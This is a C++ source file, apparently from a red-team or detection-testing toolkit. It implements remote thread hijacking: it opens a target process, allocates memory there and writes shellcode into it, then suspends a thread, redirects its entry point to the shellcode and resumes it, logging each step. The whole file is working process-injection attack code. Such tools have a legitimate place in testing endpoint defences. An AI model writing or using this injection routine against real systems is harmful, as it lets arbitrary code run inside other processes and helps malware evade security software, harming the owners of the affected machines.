#include <cstdio>

#include "sysapi.h"
#include "scripts.h"

namespace scripts {

bool inject_hijack_remote_thread(uint32_t pid,
                                 RemoteProcessOpenMethod open_method,
                                 RemoteProcessMemoryMethod memory_method) {

    wprintf(L"\nOpening the target process\n");
    sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
    if (ProcessHandle == NULL) {
        return false;
    }

    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());

    bool is_64;
    bool res = sysapi::ProcessGetWow64Info(ProcessHandle.get(), is_64);
    if (!res) {
        return false;
    }

    wprintf(L"  [+] process is %s-bit\n", is_64 ? L"64" : L"32");

    wprintf(L"\nPlacing shellcode in the target process\n");

    RemoteProcessMemoryContext ctx;
    ctx.method = memory_method;
    ctx.ProcessHandle = ProcessHandle.get();
    ctx.Size = (ULONG)default_shellcode_size;

    res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    wprintf(L"  [*] writing shellcode...\n");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    wprintf(L"\nHijacking a remote thread\n");

    sysapi::unique_handle ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get());
    if (ThreadHandle == NULL) {
        return false;
    }

    wprintf(L"  [+] thread opened, HANDLE = 0x%p\n", ThreadHandle.get());

    res = sysapi::ThreadSuspend(ThreadHandle.get());
    if (!res) {
        return false;
    }

    wprintf(L"  [+] thread suspended, HANDLE = 0x%p\n", ThreadHandle.get());

#if defined(_WIN64)
    if (is_64) {
        res = thread_set_execute<false, true>(ThreadHandle.get(), ctx.RemoteBaseAddress);
    }
    else {
#endif
        res = thread_set_execute<false, false>(ThreadHandle.get(), ctx.RemoteBaseAddress);
#if defined(_WIN64)
    }
#endif

    if (!res) {
        return false;
    }

    wprintf(L"  [+] thread EP set, HANDLE = 0x%p\n", ThreadHandle.get());

    res = sysapi::ThreadResume(ThreadHandle.get());
    if (!res) {
        return false;
    }

    wprintf(L"  [+] thread resumed, HANDLE = 0x%p\n", ThreadHandle.get());

    wprintf(L"\nSuccess\n");
    return true;
}

}